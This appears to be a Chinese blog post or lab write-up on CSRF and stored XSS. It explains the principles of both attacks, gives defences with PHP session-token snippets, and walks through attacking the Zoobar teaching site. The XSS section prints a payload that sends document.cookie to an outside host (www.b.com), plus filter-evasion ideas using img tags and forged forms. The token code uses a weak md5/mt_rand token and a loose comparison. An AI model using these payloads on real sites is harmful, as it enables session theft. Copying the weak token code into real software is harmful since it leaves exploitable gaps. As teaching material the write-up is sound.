---
title: csrf攻击方式以及防御手段
copyright: true
date: 2018-09-17 14:54:15
categories: csrf
tags:
    - csrf
    - csrf攻击手段
---
## CSRF实验原理

CSRF（Cross-Site Request Forgery，跨站点伪造请求）是一种网络攻击方式，该攻击可以在受害者毫不知情的情况下以受害者名义伪造请求发送给受攻击站点，从而在未授权的情况下执行在权限保护之下的操作，具有很大的危害性。具体来讲，可以这样理解CSRF攻击：攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作，比如以你的名义发送邮件、发消息，盗取你的账号，添加系统管理员，甚至于购买商品、虚拟货币转账等。

## CSRF攻击原理

CSRF攻击原理比较简单，如图1所示。其中Web A为存在CSRF漏洞的网站，WebB为攻击者构建的恶意网站，User C为Web A网站的合法用户。

![CSRF攻击原理](/images/CSRF攻击原理)

1、用户C打开浏览器，访问受信任网站A，输入用户名和密码请求登录网站A；

2、在用户信息通过验证后，网站A产生Cookie信息并返回给浏览器，此时用户登录网站A成功，可以正常发送请求到网站A；

3、用户未退出网站A之前，在同一浏览器中，打开一个TAB页访问网站B；

4、网站B接收到用户请求后，返回一些攻击性代码，并发出一个请求要求访问第三方站点A；

5、浏览器在接收到这些攻击性代码后，根据网站B的请求，在用户不知情的情况下携带Cookie信息，向网站A发出请求。网站A并不知道该请求其实是由B发起的，所以会根据用户C的Cookie信息以C的权限处理该请求，导致来自网站B的恶意代码被执行。

## CSRF的防御

### 1)验证HTTP Referer字段

根据HTTP协议，在HTTP头中有一个字段叫Referer，它记录了该HTTP请求的来源地址。在通常情况下，访问一个安全受限页面的请求必须来自于同一个网站。比如某银行的转账是通过用户访问http://bank.test/test?page=10&userID=101&money=10000页面完成，用户必须先登录bank.test，然后通过点击页面上的按钮来触发转账事件。当用户提交请求时，该转账请求的Referer值就会是转账按钮所在页面的URL（本例中，通常是以bank.test域名开头的地址）。而如果攻击者要对银行网站实施CSRF攻击，他只能在自己的网站构造请求，当用户通过攻击者的网站发送请求到银行时，该请求的Referer是指向攻击者的网站。因此，要防御CSRF攻击，银行网站只需要对于每一个转账请求验证其Referer值，如果是以bank. test开头的域名，则说明该请求是来自银行网站自己的请求，是合法的。如果Referer是其他网站的话，就有可能是CSRF攻击，则拒绝该请求。

### 2)在请求中添加token并验证
CSRF攻击之所以能够成功，是因为攻击者可以伪造用户的请求，该请求中所有的用户验证信息都存在于Cookie中，因此攻击者可以在不知道这些验证信息的情况下直接利用用户自己的Cookie来通过安全验证。由此可知，抵御CSRF攻击的关键在于：在请求中放入攻击者所不能伪造的信息，并且该信息不存在于Cookie之中。鉴于此，系统开发者可以在HTTP请求中以参数的形式加入一个随机产生的token，并在服务器端建立一个拦截器来验证这个token，如果请求中没有token或者token内容不正确，则认为可能是CSRF攻击而拒绝该请求。

这种方法要比检查 Referer 要安全一些，token 可以在用户登陆后产生并放于 session 之中，然后在每次请求时把 token 从 session 中拿出，与请求中的 token 进行比对，但这种方法的难点在于如何把 token以参数的形式加入请求。对于 GET请求，token将附在请求地址之后，这样 URL就变成http://url?csrftoken=tokenvalue。而对于 POST请求来说，要在 form的最后加上 <inputtype=”hidden” name=”csrftoken” value=”tokenvalue”/>，这样就把 token以参数的形式加入请求了。但是，在一个网站中，可以接受请求的地方非常多，要对于每一个请求都加上 token 是很麻烦的，并且很容易漏掉，通常使用的方法就是在每次页面加载时，使用 javascript 遍历整个 dom 树，对于 dom 中所有的 a 和 form 标签后加入 token。这样可以解决大部分的请求，但是对于在页面加载之后动态生成的 html 代码，这种方法就没有作用，还需要程序员在编码时手动添加 token。


实验基本思路就是1）启动session；2）在session中产生一个随机数，并且通过MD5或者其他散列函数进行散列；3)将session中生成的值放到表单中。4)在用户提交表单需要修改数据库的时候进行验证，用户提交的token是否和session中保存的token一致，只有一致的情况下，才进行数据库操作。

1）启动session
session_start();


2）在session中产生一个随机数
<?php $_SESSION['csrf']=md5(uniqid(mt_rand(),true)); ?>


3）将session中生成的值放在表单中这个值就是token
<input type=hidden name=token value="<?php echo $_SESSION['csrf']?>">


4）用户提交表单验证提交的token是否和session中保存的值一致

 if($_POST['submission'] && $_SESSION['csrf']==$_POST['token']) 


 XSS又称CSS，全称CrossSiteScript，跨站脚本攻击，是Web程序中常见的漏洞，XSS属于被动式且用于客户端的攻击方式，所以容易被忽略其危害性。其原理是攻击者向有 XSS漏洞的网站中输入(传入)恶意的HTML代码，当其它用户浏览该网站时，这段HTML代码会自动执行，从而达到攻击的目的。如，盗取用户 Cookie、破坏页面结构、重定向到其它网站等。

XSS攻击类似于SQL注入攻击，攻击之前，我们先找到一个存在XSS漏洞的网站。理论上，所有可输入的地方没有对输入数据进行处理的话，都会存在XSS漏洞，漏洞的危害取决于攻击代码的威力。

我们实验中的XSS代码会保存在数据库中，也称为Stored XSS，也即存储式XSS漏洞。由于其攻击代码作为合法的输入已经存储到服务器上的数据库中，其他人在访问该页面的时候，服务器会自动地从数据库中取出该攻击串返回给用户，然后用户的浏览器则会自动执行该段代码，因此，攻击者只需要在自己的页面中写上攻击代码，其他所有访问该页面的人都会受到攻击。


实验步骤：

第一步也即如何找到XSS漏洞。一般而言，如果网站某个用户输入点能够执行alert(1)，弹出一个框，也就证明这是一个XSS漏洞。

为了执行JS，一般而言需要<script>或伪协议javascript:，但是Zoobar网站本身对<script>标签和javascript:都进行了过滤，为降低实验难度，允许本次实验对网站源码进行修改，从而可以执行XSS攻击。

典型的测试代码：

<ahref=javascript:alert(1)>hello</a>

<script>alert（1）</script>

 

实验内容第一步包括steal cookie：

典型攻击代码如：

<script>window.open(“www.b.com?param=”+document.cookie)</script>

此时只需要在www.b.com 写代码保存或者打印document.cookie值即可。

譬如 php代码的echo $_GET[‘param’]；或者创建一个文件，将cookie的值保存下来。

 

因为window本身也是重点过滤对象，所以可以考虑借助于img或a这种白名单上的标签。

<img>会自动向src网站发出请求，但是为了获得document.cookie的值而不是作为字符串将它发送出去，必须要在JS中使用img

所以常见的做法是使用 document.write，自己写出来一个<img>标签,然后把document.cookie的值作为参数附在链接之后。

 

从这里可以看出，使用JS可以实现HTML，从而也为接下来的攻击提供了思路。

Javascript提供createElement()和appendchild()函数，它可以创建元素并将新创建的元素附在document对象中。因此，只要存在XSS漏洞可以执行JS代码，攻击者可以创建Form表单以及Form表单中的每一项input或textarea，也即可以模拟transfer zoobar和更改profile的动作，这样，所有访问攻击者页面的用户都会被攻击。

XSS的防御：

输入过滤，标签转换，HttpOnly防止偷cookie